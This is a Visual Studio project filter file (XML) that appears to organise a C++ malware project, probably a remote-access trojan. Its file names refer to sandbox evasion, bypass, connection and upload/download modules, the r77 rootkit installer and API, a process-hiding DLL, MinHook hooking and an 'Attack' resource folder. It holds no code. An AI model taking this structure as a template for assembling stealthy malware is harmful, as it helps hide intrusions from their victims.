<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="源文件">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="头文件">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="资源文件">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="头文件\resource">
      <UniqueIdentifier>{6a6b527f-ae8c-4cc1-a0de-74e7324e832e}</UniqueIdentifier>
    </Filter>
    <Filter Include="头文件\resource\Encrytion">
      <UniqueIdentifier>{bb2390e9-3c27-4a08-a4de-db3490cf68ff}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块">
      <UniqueIdentifier>{340ca733-cc74-4212-8a1a-b98c4fb6fed6}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\主模块">
      <UniqueIdentifier>{f9bcb4cd-bd42-4f74-9dcf-22a0cb070683}</UniqueIdentifier>
    </Filter>
    <Filter Include="头文件\hie task Process">
      <UniqueIdentifier>{92142823-e8a6-406b-921a-4a2251b10608}</UniqueIdentifier>
    </Filter>
    <Filter Include="资源文件\hid Task Process">
      <UniqueIdentifier>{c31c4ef1-0f7e-4bbb-a669-af18ebf1c436}</UniqueIdentifier>
    </Filter>
    <Filter Include="资源文件\Attack">
      <UniqueIdentifier>{b6f6cc4a-faa0-47d8-83e9-55bfb9c89976}</UniqueIdentifier>
    </Filter>
    <Filter Include="源文件\函数模块\hide System Project">
      <UniqueIdentifier>{dab5732c-cb23-459a-ac1c-43cf39f7a063}</UniqueIdentifier>
    </Filter>
    <Filter Include="头文件\hide System Project">
      <UniqueIdentifier>{0f471f85-b41f-4d73-ad1d-3b304e8f80bb}</UniqueIdentifier>
    </Filter>
    <Filter Include="资源文件\hide System Porject">
      <UniqueIdentifier>{6dc04036-afd0-40a0-8c83-5129f22144dc}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Anti sendbox.cpp">
      <Filter>源文件\函数模块</Filter>
    </ClCompile>
    <ClCompile Include="Bypass.cpp">
      <Filter>源文件\函数模块</Filter>
    </ClCompile>
    <ClCompile Include="Connect.cpp">
      <Filter>源文件\函数模块</Filter>
    </ClCompile>
    <ClCompile Include="Encryption.cpp">
      <Filter>源文件\函数模块</Filter>
    </ClCompile>
    <ClCompile Include="file_operation.cpp">
      <Filter>源文件\函数模块</Filter>
    </ClCompile>
    <ClCompile Include="Funtions.cpp">
      <Filter>源文件\函数模块</Filter>
    </ClCompile>
    <ClCompile Include="control.cpp">
      <Filter>源文件\主模块</Filter>
    </ClCompile>
    <ClCompile Include="uoload_or_download-function.cpp">
      <Filter>源文件\函数模块</Filter>
    </ClCompile>
    <ClCompile Include="kernel.cpp">
      <Filter>源文件\函数模块</Filter>
    </ClCompile>
    <ClCompile Include="hand file\r77\r77 hand\Install.cpp">
      <Filter>源文件\函数模块\hide System Project</Filter>
    </ClCompile>
    <ClCompile Include="hand file\r77\r77 hand\r77api.cpp">
      <Filter>源文件\函数模块\hide System Project</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="API.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="Un-main.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="resource\Encryption\aes_transfer.h">
      <Filter>头文件\resource\Encrytion</Filter>
    </ClInclude>
    <ClInclude Include="resource\Encryption\aes_pre.h">
      <Filter>头文件\resource\Encrytion</Filter>
    </ClInclude>
    <ClInclude Include="resource.h">
      <Filter>头文件</Filter>
    </ClInclude>
    <ClInclude Include="resource\内核\MinHook.h">
      <Filter>头文件\hie task Process</Filter>
    </ClInclude>
    <ClInclude Include="hand file\r77\r77 hand\Install.h">
      <Filter>头文件\hide System Project</Filter>
    </ClInclude>
    <ClInclude Include="hand file\r77\r77 hand\ntdll.h">
      <Filter>头文件\hide System Project</Filter>
    </ClInclude>
    <ClInclude Include="hand file\r77\r77 hand\r77api.h">
      <Filter>头文件\hide System Project</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="0x7E9FB-net.rc">
      <Filter>资源文件</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="file\ProcessHide.dll">
      <Filter>资源文件\hid Task Process</Filter>
    </None>
    <None Include="file\libuv.dll">
      <Filter>资源文件\Attack</Filter>
    </None>
    <None Include="hand file\r77\exe file\InstallStager.exe">
      <Filter>资源文件\hide System Porject</Filter>
    </None>
  </ItemGroup>
  <ItemGroup>
    <Library Include="resource\内核\libMinHook.x64.lib">
      <Filter>资源文件\hid Task Process</Filter>
    </Library>
  </ItemGroup>
</Project>